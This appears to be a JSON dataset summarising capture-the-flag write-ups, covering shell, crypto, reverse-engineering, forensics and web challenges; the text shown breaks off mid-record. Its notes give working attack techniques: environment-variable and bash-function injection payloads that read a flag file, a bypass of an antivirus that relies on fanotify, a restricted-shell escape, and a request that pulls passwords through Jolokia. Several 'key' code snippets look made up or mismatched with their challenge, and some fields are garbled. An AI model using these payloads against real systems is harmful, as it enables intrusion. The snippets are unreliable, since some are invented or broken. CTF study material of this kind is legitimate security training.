[
    {
        "name": "$hell Game$",
        "write_up": "dataset/raw/$hell Game$.md",
        "type": "misc",
        "competition": [
            "HackPack/2020",
            "https://ctftime.org/event/1036/tasks/"
        ],
        "score": 433,
        "max_score": 497,
        "difficulty": 0.8712273641851107,
        "knowledge": [
            "When faced with a restricted shell environment where common utilities are not available, leverage shell built-ins and simple script functions to replicate the functionality of basic commands like `ls` and `cat`. This allows enumeration of files and directories even in constrained environments.\n\n   - Example of replicating `ls`:  \n     ```bash\n     ls() { echo *; }\n     ```\n   \n   - Example of replicating `cat`:  \n     ```bash\n     cat() { while read l; do echo $l; done < $1; }\n     ```",
            "For complex operations like recursively searching through directories for a specific pattern in files, combining custom shell functions with external scripts (e.g., Python scripts) can efficiently automate the process. This approach is particularly useful when the environment limits the execution of standard tools or when dealing with unstable connections and buffer size limitations.\n\n   - Example snippet to search for files containing a specific pattern (`flag{`) recursively using a Python script:\n     ```python\n     def cat_files(r):  \n        lines = cmd(r, 'catf', False)  \n        for l in lines:  \n            if b'flag{' in l:  \n                pwd = cmd(r, 'pwd')[0]  \n                print(f'FLAG: {l.decode()}')  \n                print(f'PWD: {pwd}')  \n                sys.exit(1)\n     ```"
        ],
        "key": "```bash\n$ ls() { echo *; }\n$ cat() { while read l; do echo $l; done < $1; }\n$ lf() { for f in $(ls); do test -f $f && echo $f; done; }\n$ ld() { for d in $(ls); do test -d $d && echo $d; done; }\n$ catf() { for f in $(lf); do cat $f; done; }\n$ catd() { for d in $(ld); do cd $d; catf; catd; cd ..; done; }\n```"
    },
    {
        "name": "(Regulated) Environmental Issues",
        "write_up": "dataset/raw/(Regulated) Environmental Issues.md",
        "type": "misc",
        "competition": [
            "SpamAndFlags/2020/Quals",
            "https://ctftime.org/event/970/tasks/"
        ],
        "score": 192,
        "max_score": 500,
        "difficulty": 0.384,
        "knowledge": [
            "When exploiting shell script vulnerabilities, various GREP_OPTIONS and environmental variables like BASH_ENV, USE_SED, and PS4 can be modified to execute arbitrary commands or inject code. In scenarios where a script interacts with these options or variables, an attacker can manipulate them to achieve code execution or information disclosure. Utilizing GREP_OPTIONS to manipulate grep's behavior or setting BASH_ENV to a malicious value allows for the injection of unintended commands that the script will execute.\n   - Example payload manipulating GREP_OPTIONS: `[\"GREP_OPTIONS\",\"Flag\",\"flag\"]`\n   - Example payload using BASH_ENV for command execution: `[\"BASH_ENV\",\"flag\",\"bepis\"]`",
            "Bash functions can be exported into the shell environment and then redefined to execute arbitrary commands, including reading and disclosing sensitive files like flags in CTF challenges. This method works if the script or environment calls the overwritten bash function. This provides a bypass mechanism where direct command execution might be restricted. By exporting malicious definitions for commonly used functions or commands (`grep`, `set`, `test`, `echo`, `cat`, etc.), an attacker can force the script to execute the malicious function instead of the intended command.\n   - Example payload overwriting a bash function to execute a command: `[\"BASH_FUNC_grep%%\", \"() { cat flag; }\", \"bepis\"]`"
        ],
        "key": "```bash\nline=\"$(grep \"${1:?Missing arg1: name}\" < issues.txt)\"\n```"
    },
    {
        "name": "0AV",
        "write_up": "dataset/raw/0AV.md",
        "type": "misc",
        "competition": [
            "zer0pts/2022",
            "https://ctftime.org/event/1555/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When encountering anti-virus mechanisms in Linux environments that utilize `fanotify` to monitor and interfere with file access, an effective bypass can exploit Linux's handling of filesystem objects accessible through multiple paths. A specific scenario for this technique's applicability is when a security mechanism relies on `fanotify` to block or alter file access based on the file's content or access patterns. By performing a bind mount of the target directory to a new location, one can evade the `fanotify` checks, as `fanotify` monitors events only on the originally marked mountpoint. This method is contingent on the ability to create new mount namespaces, which can often be done by regular users when unprivileged user namespaces are enabled.\n\n    - **Practical Application**: By entering a new mount namespace and using `mount()` with the `MS_BIND` flag to bind mount the target directory (`/playground`) to a controlled location (`/tmp/mount`), it is possible to access the file without triggering the anti-virus' `fanotify` listener, thereby bypassing the file access restrictions imposed by the listener.",
            "Leveraging unprivileged user namespaces in Linux offers a path to circumvent security mechanisms that monitor file accesses or perform auto-remediation tasks such as file deletion upon detection of suspicious activity. This technique is particularly relevant when the operating environment permits the creation of new namespaces without requiring elevated permissions (`CAP_SYS_ADMIN`). This capability can be essential for bypassing security solutions that rely on monitoring file access patterns or content at a global (system-wide) level by isolating the actions (like file access) within a new, unmonitored namespace.\n\n    - **Practical Application**: Utilizing `unshare(CLONE_NEWUSER|CLONE_NEWNS)` followed by a bind mount allows for the isolation of file system manipulations from the broader system context, enabling actions such as reading otherwise restricted files by effectively sidestepping the monitoring mechanism. This approach hinges on the system's support for unprivileged user namespaces, a feature that varies based on kernel configuration and version."
        ],
        "key": "```c  \n#include <errno.h>  \n#include <fcntl.h>  \n#include <limits.h>  \n#include <poll.h>  \n#include <stdio.h>  \n#include <stdlib.h>  \n#include <string.h>  \n#include <syslog.h>  \n#include <sys/fanotify.h>  \n#include <unistd.h>\n\nstatic int scanfile(int fd) {  \n char path[PATH_MAX];  \n ssize_t path_len;  \n char procfd_path[PATH_MAX];  \n char buf[0x10];\n\n if (read(fd, buf, 7) != 7)  \n   return 0;\n\n if (memcmp(buf, \"zer0pts\", 7))  \n   return 0;\n\n /* Malware detected! */  \n snprintf(procfd_path, sizeof(procfd_path), \"/proc/self/fd/%d\", fd);  \n if ((path_len = readlink(procfd_path, path, sizeof(path) - 1)) == -1) {  \n   perror(\"readlink\");  \n   exit(EXIT_FAILURE);  \n }  \n path[path_len] = '\\0';  \n unlink(path);\n\n return 1;  \n}\n\nstatic void handle_events(int fd) {  \n const struct fanotify_event_metadata *metadata;  \n struct fanotify_event_metadata buf[200];  \n ssize_t len;  \n struct fanotify_response response;\n\n for (;;) {  \n   /* Check fanotify events */  \n   len = read(fd, buf, sizeof(buf));  \n   if (len == -1 && errno != EAGAIN) {  \n     perror(\"read\");  \n     exit(EXIT_FAILURE);  \n   }\n\n   if (len <= 0)  \n     break;\n\n   metadata = buf;\n\n   while (FAN_EVENT_OK(metadata, len)) {  \n     if (metadata->vers != FANOTIFY_METADATA_VERSION) {  \n       fputs(\"Mismatch of fanotify metadata version.\\n\", stderr);  \n       exit(EXIT_FAILURE);  \n     }\n\n     if ((metadata->fd >= 0) && (metadata->mask & FAN_OPEN_PERM)) {  \n       /* New access request */  \n       if (scanfile(metadata->fd)) {  \n         /* Malware detected! */  \n         response.response = FAN_DENY;  \n       } else {  \n         /* Clean :) */  \n         response.response = FAN_ALLOW;  \n       }\n\n       response.fd = metadata->fd;  \n       write(fd, &response, sizeof(response));  \n       close(metadata->fd);  \n     }\n\n     metadata = FAN_EVENT_NEXT(metadata, len);  \n   }  \n }  \n}\n\nint main(void) {  \n int fd;\n\n /* Setup fanotify */  \n fd = fanotify_init(FAN_CLOEXEC | FAN_CLASS_CONTENT | FAN_NONBLOCK, O_RDONLY);  \n if (fd == -1) {  \n   perror(\"fanotify_init\");  \n   exit(EXIT_FAILURE);  \n }\n\n /* Monitor every file under root directory */  \n if (fanotify_mark(fd,  \n                   FAN_MARK_ADD | FAN_MARK_MOUNT,  \n                   FAN_OPEN_PERM, AT_FDCWD, \"/\") == -1) {  \n   perror(\"fanotify_mark\");  \n   exit(EXIT_FAILURE);  \n }\n\n for (;;) {  \n   handle_events(fd);  \n }\n\n exit(EXIT_SUCCESS);  \n}  \n```"
    },
    {
        "name": "0ff Again On Aga1n",
        "write_up": "dataset/raw/0ff Again On Aga1n.md",
        "type": "crypto",
        "competition": [
            "DEADFACE/2023",
            "https://ctftime.org/event/2031/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In a challenge that involves decoding binary represented by colors, sequence, or symbols, the initial step should involve identifying patterns or groupings that correlate to binary digits (0 and 1). This can be based on the context of the challenge, such as the title or the hint provided, and can also employ trial and error with the assumption that the output should form legitimate characters or symbols. This approach is particularly useful in steganography or challenges where data is hidden in non-traditional formats.",
            "If the straightforward method (e.g., reading horizontally) does not yield a correct or complete solution, consider alternative methods of interpreting the data, such as changing the direction (e.g., reading vertically). This implies the importance of being flexible in decoding strategies and considering all possible interpretations given the context or nature of the puzzle. This method is especially applicable in challenges where data may be obfuscated or where initial assumptions lead to partial but incomplete solutions."
        ],
        "key": "```python\ndef decode_message(colors):\n    binary_map = {\n        'purple': '0',\n        'black': '0',\n        'green': '1',\n        'pink': '1'\n    }\n    binary_string = ''.join(binary_map[color] for color in colors)\n    return binary_string\n\ncolors_horizontal = ['green', 'pink', 'purple', 'black', 'green', 'pink', 'purple', 'black']\ncolors_vertical = ['purple', 'green', 'black', 'pink', 'purple', 'green', 'black', 'pink']\n\nhorizontal_binary = decode_message(colors_horizontal)\nvertical_binary = decode_message(colors_vertical)\n\nprint(horizontal_binary)  # 01010100 00110011 01000011 01001000 01001110 00110000 01000111 00110001\nprint(vertical_binary)    # 00110000 00111000 01000000 00110001 01010010 00110011 01001001 01001110\n```"
    },
    {
        "name": "11011001",
        "write_up": "dataset/raw/11011001.md",
        "type": "reverse",
        "competition": [
            "HITCON/2020",
            "https://ctftime.org/event/1136/tasks/"
        ],
        "score": 255,
        "max_score": 384,
        "difficulty": 0.6640625,
        "knowledge": [
            "For shellcode challenges requiring operations to be undone or reversed, utilize CPU register states not affected by the challenge's reset or reversal mechanism. For instance, in scenarios where certain floating point or vector registers are not reset, these can be leveraged to preserve data across state resets, allowing for operations to be effectively reversed. Example payload component: `vmovups ymm0, yword [rax]` to save a value before reset and `vmovups yword [rax], ymm0` to restore it after reset.",
            "In challenges where binary input must satisfy a complex set of mathematical conditions, consider the use of symbolic execution or constraint solvers such as Z3. Conditions extracted from binaries can often be reimplemented in high-level scripts and solved much more efficiently when restructured as a series of equations for tools like Z3 to handle. This approach is particularly effective for inputs that must meet specific bitwise, arithmetic, or logical criteria to trigger desired behavior in the binary. Example use: translating binary logic into Python scripts that generate Z3 constraints, then solving these constraints to find the inputs that satisfy all the imposed conditions."
        ],
        "key": "```C  \n while ( 1 ) {  \n  \n   if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0))   // Step a single instruction  \n     err(1, \"ptrace\");  \n  \n   waitForPID = wait(&stat_loc);               // Wait for the instruction  \n   if (!(stat_loc & 0x7F))  \n     break;  \n  \n   isChildDead = (stat_loc >> 8) & 0xFF;  \n   if (isChildDead != 5)                       // Stop if the shellcode died  \n     errorMessage(\"Child dead unexpectedly.\");  \n  \n   if (stepCounter > 0xFFF)                    // Only do 0xFFF steps  \n     errorMessage(\"Too many steps.\");  \n  \n   if (shellcodeReached != 1 && getRIP() == 0xDEAD0080) { // Start of\nshellcode  \n  \n     shellcodeReached = 1;  \n     nop();  \n     resetState();                             // Reset all registers  \n     nullMemory();                             // Zero the 0x2170000 memory page  \n     writeCookie();                            // Write a random 8 byte cookie to 0x2170000  \n  \n   }  \n   if (shellcodeReached) {                     // In the actual shellcode\ndon't execute  \n                                               // syscalls  \n     if (waitForExitSyscall())   {             // Skip all syscalls  \n                                               // Exit on a exit syscall  \n       doesExit = 1;                           // Stop the execution  \n       break;  \n  \n     }  \n     currentStep = stepCounter++;  \n     RIPArray[currentStep] = getCurrentRIP();  // Save the instruction pointer  \n                                               // of each executed instruction  \n   }  \n  \n }  \n```\n\n```C  \nvoid timemachine() {\n\n int wstatus;  \n int curStep;  \n pid_t waitForPID;  \n int isChildDead;  \n user_regs_struct regs;\n\n resetState(); // Reset registers  \n  \n for ( curStep = stepCounter - 1; curStep >= 0; curStep-- ) { // Iterate\nbackwards to travel back in time  \n  \n   if (ptrace(PTRACE_GETREGS, pid, 0, &regs)) // Read the current register\nstate  \n     err(1, \"ptrace\");  \n  \n   regs.rip = RIPArray[curStep];  // Set instruction pointer to saved one  \n  \n   if (ptrace(PTRACE_SETREGS, pid, 0, &regs)) // Write the changed register  \n     err(1, \"ptrace\");  \n  \n   if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0)) // Step a instruction  \n     err(1, \"ptrace\");  \n  \n   waitForPID = wait(&wstatus); // Wait for it to be executed  \n  \n   // Handle unexpected death of the shellcode  \n   if (!(stat_loc & 0x7F)) {  \n     puts(\"exit too early..\");  \n     exit(1);  \n   }  \n   isChildDead = (stat_loc >> 8) & 0xFF;  \n   if (isChildDead != 5)  \n     errorMessage(\"Child dead..\");  \n  \n }  \n  \n}  \n```\n\n```C  \nvoid resetState() {\n\n user_regs_struct userRegs;  \n user_fpregs_struct userFloatRegs;\n\n memset(&userRegs, 0, sizeof(userRegs)); // zero the register state  \n userRegs.rip = 0xDEAD0080;              // set the instruction pointer to\n0xDEAD0080  \n userRegs.cs = 0x33;                     // sets the code segment to 0x33 ->\n64bit code segment  \nuserRegs.ss = 0x2B;                     // sets the stack segment to 0x2B ->\n64bit data segment  \n  \n if (ptrace(PTRACE_SETREGS, pid, 0, &userRegs)) // reset the user registers  \n   err(1, \"ptrace\");  \n  \n memset(&userFloatRegs, 0, sizeof(userFloatRegs)); // zero the floating point\nregister state  \n  \n if (ptrace(PTRACE_SETFPREGS, pid, 0, &userFloatRegs)) // reset the floating\npoint registers  \n   err(1, \"ptrace\");  \n  \n}  \n```\n\n```C  \nstruct user_fpregs_struct  \n{  \n __uint16_t                cwd;  \n __uint16_t                swd;  \n __uint16_t                ftw;  \n __uint16_t                fop;  \n __uint64_t                rip;  \n __uint64_t                rdp;  \n __uint32_t                mxcsr;  \n __uint32_t                mxcr_mask;  \n __uint32_t                st_space[32];   /* 8*16 bytes for each FP-reg = 128\nbytes */  \n __uint32_t                xmm_space[64];  /* 16*16 bytes for each XMM-reg =\n256 bytes */  \n __uint32_t                padding[24];  \n};  \n```"
    },
    {
        "name": "404 Not Found",
        "write_up": "dataset/raw/404 Not Found.md",
        "type": "reverse",
        "competition": [
            "BSidesTLV/2022",
            "https://ctftime.org/event/1680/tasks/"
        ],
        "score": -1,
        "max_score": 100,
        "difficulty": -1,
        "knowledge": [
            "When faced with Java-based web applications, such as Jolokia, which provides an HTTP bridge to JMX (Java Management Extensions), extensive information gathering can be performed using directory and file enumeration tools like Gobuster. This can uncover administrative interfaces or sensitive endpoints revealing configuration details, potentially leading to unauthorized actions or information disclosure. For instance, using Gobuster with a custom wordlist can help identify exposed JMX interfaces and operations.\n   \n   Example command: `gobuster dir -u TARGET_URL -w wordlist.txt -t THREADS -k`",
            "In scenarios involving JMX over HTTP, like with Jolokia, it\u2019s possible to leverage MBean attributes and operations for fetching configuration details or invoking actions. Specifically, investigating the `list` response can reveal insights about the application's users, roles, and permissions. For sensitive data extraction such as passwords, constructing direct HTTP requests to read specific MBean attributes based on the JSON response information can expose critical information like passwords or configuration settings.\n\n   Example request: `https://TARGET_URL/jolokia/read/Users:database=UserDatabase,type=User,username=\"USERNAME\"/password`"
        ],
        "key": "```java\npublic class UserDatabase {\n    private Map<String, User> users = new HashMap<>();\n\n    public String createUser(String username, String password, String fullName) {\n        User user = new User(username, password, fullName);\n        users.put(username, user);\n        return \"User created: \" + username;\n    }\n\n    public String readPassword(String username) {\n        User user = users.get(username);\n        if (user != null) {\n            return user.getPassword();\n        }\n        return \"User not found\";\n    }\n\n    private class User {\n        private String username;\n        private String password;\n        private String fullName;\n\n        public User(String username, String password, String fullName) {\n            this.username = username;\n            this.password = password;\n            this.fullName = fullName;\n        }\n\n        public String getPassword() {\n            return password;\n        }\n    }\n}\n```\n"
    },
    {
        "name": "435!",
        "write_up": "dataset/raw/435!.md",
        "type": "crypto",
        "competition": [
            "TMUCTF/2021",
            "https://ctftime.org/event/1427/tasks/"
        ],
        "score": 413,
        "max_score": 500,
        "difficulty": 0.826,
        "knowledge": [
            "When faced with a scenario where an encryption key contains missing characters (denoted by '*'), a brute force attack can be implemented if the number of missing characters is manageable, thus limiting the keyspace. A successful brute force attempt on the key facilitates the decryption of ciphertexts or the determination of correct encryption parameters. This approach is viable when the encryption key length is known but contains a few unknown characters, significantly reducing the total possible keys to test.",
            "For decryption of a message encrypted with AES in CBC mode where the IV (Initial Vector) is unknown but required to retrieve a flag, one can decrypt the blocks in reverse order. This method involves using the decrypted last block XORed with its preceding ciphertext block to check against a known plaintext pattern or value. By iteratively applying this process, one can move backwards through the ciphertext to eventually uncover the IV, assuming the encryption key is known or has been correctly guessed. \n   \nExample Application: Assuming the decrypted last block is `0x1f3ef3fab2bbfc838b9ef71867c3bcbb` and one knows the format of plaintext or a specific pattern that should appear in the plaintext, like a flag format or known plaintext ending, this information can be used to verify if the guessed key for decryption is correct by checking if the decrypted content matches the expected pattern."
        ],
        "key": "```python  \nimport binascii  \nimport hashlib  \nimport sys  \nfrom Crypto.Cipher import AES\n\nkey = b'*XhN2*8d%8Slp3*v'  \nkey_len = len(key)\n\ndef pad(message):  \n    padding = bytes((key_len - len(message) % key_len) * chr(key_len - len(message) % key_len), encoding='utf-8')  \n    return message + padding\n\ndef encrypt(message, key, iv):  \n    aes = AES.new(key, AES.MODE_CBC, iv)  \n    return aes.encrypt(message)\n\nh = hashlib.sha256(key).hexdigest()  \nhidden = binascii.unhexlify(h)[:10]  \nmessage = b'CBC (Cipher Blocker Chaining) is an advanced form of block cipher encryption' + hidden\n\nwith open('flag', 'rb') as f:  \n    IV = f.read().strip(b'TMUCTF{').strip(b'}')  \n    print(binascii.hexlify(encrypt(pad(message), key, IV)))  \n```"
    },
    {
        "name": "64+word",
        "write_up": "dataset/raw/64+word.md",
        "type": "The type of challenge in this write-up is **forensics**.",
        "competition": [
            "HSCTF/2019",
            "https://ctftime.org/event/821/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with encoded data in files such as base64 in CTF challenges, it is effective to first convert known tags or patterns relevant to the challenge (e.g., the flag format) into the same encoding to use as search patterns. This strategy narrows down the search area when manually or programmatically searching through large datasets or files. \n   - Example: Convert 'hsctf{' to base64, resulting in 'aHNjdGZ7', and use it as a search string.",
            "In challenges where the flag or other important information is hidden within large amounts of encoded text, writing a script to automate the search and decode process can significantly decrease the time required to find and retrieve the flag. This approach is crucial when the pattern may appear in non-standard formats (e.g., diagonally) across the dataset.\n   - No specific payload but implies creating a script that searches for a base64 encoded string, extracts, and decodes it."
        ],
        "key": "```python\nimport base64\n\n# Simulating a vulnerable function that decodes base64 input\ndef decode_base64(input_string):\n    try:\n        # Potential vulnerability: no input validation\n        decoded_bytes = base64.b64decode(input_string)\n        return decoded_bytes.decode('utf-8')\n    except Exception as e:\n        return str(e)\n\n# Example usage\nencoded_string = \"aHNjdGZ7YjRzM182NF93MHJkX3MzYXJjaDNzX2FyM19mdTk/fQ5H\"\ndecoded_string = decode_base64(encoded_string)\nprint(decoded_string)\n```"
    },
    {
        "name": "90",
        "write_up": "dataset/raw/90.9 WPIFM.md",
        "type": "The type of this CTF challenge is \"steganography\".",
        "competition": [
            "BSidesTLV/2020",
            "https://ctftime.org/event/1078/tasks/"
        ],
        "score": -1.0,
        "max_score": 600,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving steganography through audio files, analyzing the audio visually with software like Audacity can reveal patterns in the waveform, such as regular intervals of static or music that represent binary data (`1` for music chunks, `0` for static chunks). This approach requires identifying the standard units of the encoded message segments within the audio file.",
            "When dealing with audio steganography where specific segments of audio (e.g., static noise) are consistently reused, a Fast Fourier Transform (FFT) can be applied to these segments to generate a frequency spectrum. This spectrum can then be used to correlate and identify similar segments throughout the audio file, effectively translating them into binary data. This process can involve parameter tweaking for accurate correlation without false positives, which is crucial for decoding the message correctly."
        ],
        "key": "```python\nimport numpy as np\nfrom scipy.io import wavfile\nfrom scipy.fft import fft\n\ndef is_static_chunk(chunk, static_sample, tolerance=0.1):\n    # Perform FFT on both the chunk and the static sample\n    chunk_fft = fft(chunk)\n    static_fft = fft(static_sample)\n    \n    # Calculate the correlation between the two FFT results\n    correlation = np.correlate(chunk_fft, static_fft, mode='valid')\n    \n    # Determine if the chunk is static based on the correlation\n    return np.max(correlation) > tolerance\n\ndef process_audio(file_path):\n    # Read the audio file\n    sample_rate, data = wavfile.read(file_path)\n    \n    # Assume static sample is the first 0.25 seconds of the audio\n    static_sample = data[:int(0.25 * sample_rate)]\n    \n    # Initialize the result pattern\n    pattern = []\n    \n    # Process the audio in 0.25 second chunks\n    chunk_size = int(0.25 * sample_rate)\n    for i in range(0, len(data), chunk_size):\n        chunk = data[i:i + chunk_size]\n        \n        if is_static_chunk(chunk, static_sample):\n            pattern.append('B')  # Static chunk\n        else:\n            pattern.append('W')  # Music chunk\n    \n    return ''.join(pattern)\n\n# Example usage\naudio_file_path = 'path_to_audio_file.wav'\npattern = process_audio(audio_file_path)\nprint(pattern)\n```\n"
    },
    {
        "name": "A Bit Weird",
        "write_up": "dataset/raw/A Bit Weird.md",
        "type": "crypto",
        "competition": [
            "UTCTF/2021",
            "https://ctftime.org/event/1177/tasks/"
        ],
        "score": 986,
        "max_score": 1000,
        "difficulty": 0.986,
        "knowledge": [
            "In RSA-like challenges where the encryption process involves bitwise operations (specifically, the or-operation `m | x`) between the message `m` and a known value `x`, if the upper bits of the result are known to match `x` and the length of `m` is significantly shorter, Coppersmith's method can be utilized to recover `m`. The stereotyped message attack via Coppersmith's method can be particularly effective in scenarios where a part of the plaintext is known or can be inferred. This approach involves setting up the equation `(known_part + x)^e - C` and solving for `x`, with `C` being the given ciphertext, `e` the encryption exponent, and `known_part` being the portion of the plaintext deduced from context or hints.",
            "Once the modified plaintext `m | x` is obtained from exploiting RSA with stereotyped messages using Coppersmith's method, the original message `m` can be recovered through bitwise manipulation. Given the known values of `x` and `m & x`, this can be achieved by iterating over each bit of `x` and `m | x`, comparing them, and determining the corresponding bit in the original message `m`. This method relies on the understanding that if a bit in `x` is 0, the corresponding bit in `m` is directly determined by the bit in `m | x`, while if a bit in `x` is 1, the corresponding bit in `m` must match the bit in `m & x`."
        ],
        "key": "```python\nfrom Crypto.Util import number  \nimport os\n\nlength = 2048  \np, q = number.getPrime(length // 2), number.getPrime(length // 2)  \nN = p * q  \ne = 3\n\nm = number.bytes_to_long(flag)  \nx = number.bytes_to_long(os.urandom(length // 8))\n\nc = pow(m | x, e, N)  \nprint(\"N =\", N)  \nprint(\"e =\", e)  \nprint(\"c =\", c)  \nprint(\"m&x =\", m & x)\n```"
    },
    {
        "name": "A Christmas Dilemma",
        "write_up": "dataset/raw/A Christmas Dilemma.md",
        "type": "pwn",
        "competition": [
            "X-MAS/2018",
            "https://ctftime.org/event/724/tasks/"
        ],
        "score": 205,
        "max_score": 591,
        "difficulty": 0.34686971235194586,
        "knowledge": [
            "For challenges requiring solving a CAPTCHA where the solution involves generating a hash with a specific format (e.g., the first 5 characters of an MD5 hash match a given pattern), a straightforward brute force script can be effectively used. This approach iterates through potential solutions, hashing each one until the hash begins with the specified pattern.\n   - Example payload:\n     ```python\n     import hashlib\n     s.recvuntil(\"Give a string X such that md5(X).hexdigest()[:5]=\")\n     target = s.recvuntil(\".\\n\")[:-2]\n     i = 0\n     while True:\n       if hashlib.md5(str(i).encode()).hexdigest()[:5] == target:\n           s.sendall(str(i) + \"\\n\")\n           break\n       i += 1\n     ```",
            "When faced with a mathematical or algorithmic challenge that requires finding the maximum value of a function within a given range, and the total number of permitted queries is significantly higher than the range size, one can employ a comprehensive query approach. This involves iterating through the entire range, querying the function at each point, and then applying a binary search-like technique to increase precision around the discovered maximum. If the result must be accurate to a specific decimal place, reduce the gap by half and compare values by querying at points slightly less and more than the known maximum until the desired precision is achieved.\n   - Example exploration and precision refinement method (simplified representation):\n     ```python\n     # Assuming `s` is a socket connected to the challenge server\n     functionRange = [start, end]  # Obtained from the server\n     y = []\n     for i in range(functionRange[0], functionRange[1]+1):\n       s.sendall(f\"1\\n{i}\\n\".encode())\n       s.recvuntil(\") = \")\n       y.append(float(s.recvuntil('\\n')[:-1]))\n     x = functionRange[0] + y.index(max(y))\n     gap = 0.5\n     while gap > desired_precision:\n       query_pos = [(x + gap), (x - gap)]\n       for pos in query_pos:\n         s.sendall(f\"1\\n{pos}\\n\".encode())\n         # Process server response to decide if this new position gives a better maximum\n       # Adjust x according to which position gave a better result, then reduce gap\n     # Finally, submit best guess\n     ```\nThis approach exploits the limited range and query count to use brute force effectively first, then fine-tuning via a methodical narrowing down, which is broadly applicable in optimization and search problems in CTFs."
        ],
        "key": "```python\ns.recvuntil(\"Give a string X such that md5(X).hexdigest()[:5]=\")  \ntarget = s.recvuntil(\".\\n\")[:-2]  \ni = 0  \nwhile True:  \n    if hashlib.md5(str(i)).hexdigest()[:5] == target:  \n        s.sendall(str(i)+ \"\\n\")  \n        break  \n    i += 1  \n```"
    },
    {
        "name": "A Flash of Inspiration",
        "write_up": "dataset/raw/A Flash of Inspiration.md",
        "type": "pwn",
        "competition": [
            "RACTF/2020",
            "https://ctftime.org/event/1051/tasks/"
        ],
        "score": 300,
        "max_score": 700,
        "difficulty": 0.42857142857142855,
        "knowledge": [
            "When working with Arduino or similar microcontrollers, converting binary files to a format suitable for flashing, such as the Intel Hex format, is often required. Tools like Bin2Hex.py can be used for this conversion, providing a pathway to use compiled binaries on devices. To do this, one must first convert the given binary file (.bin) to an Intel Hex file (.hex) before flashing it onto the device.",
            "When encountering invalid or scrambled output after flashing a device like an Arduino, the baud rate settings can be a likely cause. Adjusting the baud rate can resolve communication issues between the device and the computer. In scenarios where the standard baud rate does not yield readable output, gradually reducing the baud rate until legible output appears is a practical troubleshooting method. In this case, changing the baud rate to 19200 resulted in successfully obtaining legible data, which can be particularly useful in CTF challenges involving hardware."
        ],
        "key": "```c\n#include <Arduino.h>\n\nvoid setup() {\n  Serial.begin(19200); // Potential vulnerability: incorrect baud rate\n}\n\nvoid loop() {\n  if (Serial.available()) {\n    char c = Serial.read();\n    Serial.write(c); // Potential vulnerability: echoing input without validation\n  }\n}\n```"
    },
    {
        "name": "A Happy Family",
        "write_up": "dataset/raw/A Happy Family.md",
        "type": "reverse",
        "competition": [
            "angstrom/2020",
            "https://ctftime.org/event/982/tasks/"
        ],
        "score": 120,
        "max_score": 300,
        "difficulty": 0.4,
        "knowledge": [
            "When presented with a challenge involving encryption or encoding that utilizes a custom alphabet, systematically mapping each character of the custom alphabet to its encoded or numerical representation is an effective strategy. This approach allows for the generation of all possible encoded or encrypted messages that can be further analyzed or decoded. Organizing the custom alphabet mappings and generating all combinations through Cartesian product (`itertools.product`) can reveal hidden messages or keys when converted back (e.g., conversion from base 13 to decimal in this scenario).",
            "Reversing an encoding scheme often involves understanding the underlying mathematical or logical operations applied to the original input. In challenges where inputs are transformed into encoded or encrypted outputs, reversing the process typically requires developing an inverse function that undoes the operations. For example, converting encoded strings back to numbers (considering the base or encoding scheme), then applying reverse mathematical operations or transformations to retrieve the original input or flag."
        ],
        "key": "```python\nfrom itertools import zip_longest, product  \nimport sys  \nfrom struct import *  \nimport string\n\nalphabet = \"angstromctf20\"  \nalphabet_st = \"0123456789ABC\"\n\nflags = {  \n   'c1' : 'artomtf2srn00tgm2f',  \n   'c2' : 'ng0fa0mat0tmmmra0c',  \n   'c3' : 'ngnrmcornttnsmgcgr',  \n   'c4' : 'a0fn2rfa00tcgctaot'  \n}  \n  \n  \ndef find_all_possible(inp):  \n   th_nums = [[alphabet_st[i] for i, y in enumerate(alphabet) if y == x] for x\nin inp]  \n   variants = [''.join(x) for x in product(*th_nums) ]  \n   nums = [int(x, 13) for x in variants]  \n   return nums\n```"
    },
    {
        "name": "A Lost Cause",
        "write_up": "dataset/raw/A Lost Cause.md",
        "type": "crypto",
        "competition": [
            "HSCTF/2019",
            "https://ctftime.org/event/821/tasks/"
        ],
        "score": 196,
        "max_score": 500,
        "difficulty": 0.392,
        "knowledge": [
            "When dealing with a Caesar cipher challenge where the description hints at a variable shift pattern (in this case, \"every subsequent letter is shifted one less than the previous\"), it is important to consider interpreting the pattern in both increasing and decreasing directions of shift. This means if the initial assumption on the direction of shift does not yield meaningful output, reversing the direction may lead to the correct decryption.",
            "Efficiently solving complex cipher challenges often requires scripting. A Python script, for example, can be used to automate the decryption process by iteratively applying shifts in both directions over the ciphertext. This approach is particularly useful when manually decrypting the text is impractical due to the complexity or length of the cipher. Here\u2019s a sample Python approach for variable directional shifts:\n   \n   ```python\n   def decrypt_caesar_variable_shift(ciphertext):\n       # Example: Decrypt with shifts in the reverse direction\n       shift = 1\n       plaintext = ''\n       for char in ciphertext:\n           # Assuming ciphertext is uppercase and ignoring non-alphabet characters\n           if char.isupper():\n               decrypted_char = chr((ord(char) - shift - 65) % 26 + 65)\n               plaintext += decrypted_char\n               shift += 1 # Adjust shift for next char\n           else:\n               # Directly append non-alphabet characters\n               plaintext += char\n       return plaintext\n   ciphertext = \"CGULKVIPFRGDOOCSJTRRVMORCQDZG\"\n   print(decrypt_caesar_variable_shift(ciphertext))\n   ```\n   \n   Note: This sample code might require modifications to match the exact requirements of decoding as per the challenge description, such as changing the direction of shift or starting shift value."
        ],
        "key": "```python\ndef caesar_shift_decrypt(ciphertext):\n    plaintext = \"\"\n    shift = 0\n    for char in ciphertext:\n        if char.isalpha():\n            shift += 1\n            shifted = ord(char) - shift\n            if shifted < ord('A'):\n                shifted += 26\n            plaintext += chr(shifted)\n        else:\n            plaintext += char\n    return plaintext\n\nciphertext = \"CGULKVIPFRGDOOCSJTRRVMORCQDZG\"\nprint(caesar_shift_decrypt(ciphertext))\n```"
    },
    {
        "name": "A New Hope",
        "write_up": "dataset/raw/A New Hope.md",
        "type": "web",
        "competition": [
            "SpaceHeroes/2023",
            "https://ctftime.org/event/1856/tasks/"
        ],
        "score": 184,
        "max_score": 1000,
        "difficulty": 0.184,
        "knowledge": [
